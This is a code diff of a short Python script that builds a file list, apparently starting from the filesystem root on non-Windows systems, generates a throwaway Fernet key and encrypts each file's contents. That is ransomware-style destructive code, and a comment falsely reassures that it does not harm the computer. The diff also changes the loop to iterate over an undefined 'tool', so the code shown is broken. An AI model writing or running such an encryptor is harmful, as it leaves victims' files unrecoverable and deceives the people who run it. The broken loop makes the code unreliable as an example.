@@ -1,9 +1,8 @@
 import os
 import time
 from os import system
-from platform import platform
 from cryptography.fernet import Fernet
-
+from platform import platform
 
 # delete
 puk = platform()[0], platform()[1],  platform()[2], platform()[3], platform()[4], platform()[5], platform()[6]
@@ -15,9 +14,8 @@ else:
     delet = 'clear'
     dr = '/'
 
-os.system(delet)
 
-# Used to encrypt this program (does not harm ur computer(mabey)...
+# Used to encrypt this program (does not harm ur computer...
 
 files = []
 
@@ -32,7 +30,7 @@ print(files)
 secretkey = Fernet.generate_key()
 
 # Going through the files list and encrpying everything
-for file in files:
+for file in tool:
 	with open(file, "rb") as thefile:
 		contents = thefile.read()
 	contents_encrypted = Fernet(secretkey).encrypt(contents)
